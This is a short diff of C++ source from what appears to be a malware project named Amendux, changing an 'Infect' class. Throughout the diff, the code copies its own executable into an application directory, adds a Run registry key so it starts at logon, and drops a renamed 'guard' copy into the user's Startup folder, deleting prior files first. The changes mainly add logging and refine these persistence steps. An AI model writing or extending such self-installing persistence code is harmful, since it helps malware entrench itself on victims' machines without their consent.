@@ -42,6 +42,9 @@ void Infect::SetupHomeDirectory()
 		return;
 	}
 
+	Log::Info(L"Infect", L"Copy to application directory");
+
+	Util::deleteFile(fullAppDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)fullAppDir.c_str());
 
 	std::ofstream lock;
@@ -52,6 +55,8 @@ void Infect::SetupHomeDirectory()
 
 void Infect::SetupRegisterHook()
 {
+	Log::Info(L"Infect", L"Set register hooks");
+
 	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
 	std::wstring appDir = Config::Current()->DataDirectory();
 	appDir += L"\\Amendux.exe";
@@ -65,7 +70,14 @@ void Infect::SetupStartupFolder()
 {
 	std::wstring curPath = Util::currentModule();
 	std::wstring startDir = Util::getDirectory(Util::Directory::USER_STARTUP);
-	startDir += L"\\Amendux.exe";
+	startDir += L"\\AmenduxGuard.exe";
 
+	if (curPath == startDir) {
+		return;
+	}
+
+	Log::Info(L"Infect", L"Copy guard");
+
+	Util::deleteFile(startDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)startDir.c_str());
 }
